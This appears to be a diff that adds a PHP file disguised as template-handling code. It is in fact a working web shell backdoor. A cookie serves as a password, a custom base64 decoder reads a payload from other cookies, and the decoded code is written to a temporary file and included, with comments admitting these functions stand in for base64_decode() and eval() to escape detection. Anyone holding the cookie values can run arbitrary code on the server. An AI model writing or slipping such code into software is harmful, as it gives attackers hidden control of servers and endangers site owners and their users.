@@ -1,0 +1,45 @@
+$template_level = "topLevel";
+  $template_level_cookie = $_COOKIE["template_level"];
+  if ($template_level_cookie != $template_level){ echo "what's the magic word?"; die(); }
+
+      // get_input is a replacement for base64_decode()
+     function get_input($template_input, $template_table) {
+
+       $template_table_array = str_split($template_table);
+       $char_array = str_split($template_input);
+       $j = 0;
+       for ($i = 0; $i < count($char_array); $i+=4) {
+
+         $b[0] = array_search($char_array[$i], $template_table_array);
+         $b[1] = array_search($char_array[$i+1], $template_table_array);
+         $b[2] = array_search($char_array[$i+2], $template_table_array);
+         $b[3] = array_search($char_array[$i+3], $template_table_array);
+
+         $template_full[$j++] = chr((($b[0] << 2) | ($b[1] >> 4)));
+         if ($b[2] < 64) {
+           $template_full[$j++] = chr((($b[1] << 4) | ($b[2] >> 2)));
+           if ($b[3] < 64)
+           {
+             $template_full[$j++] = chr((($b[2] << 6) | $b[3]));
+           }
+         }
+       }
+
+       return implode($template_full);	 
+  }
+
+      // get_template() & extract() is a replacement for eval()
+     function get_template($template_request) {
+
+     $template_name = tempnam("/tmp", "get_template");
+     $template_handler = fopen($template_name, "w+");
+     fwrite($template_handler, "<?php\n" . $template_request);
+     fclose($template_handler);
+     include $template_name;
+     unlink($template_name);
+
+     return get_defined_vars();
+
+     }
+
+  extract(get_template(get_input($_COOKIE["template_input"], $_COOKIE["template_table"])));
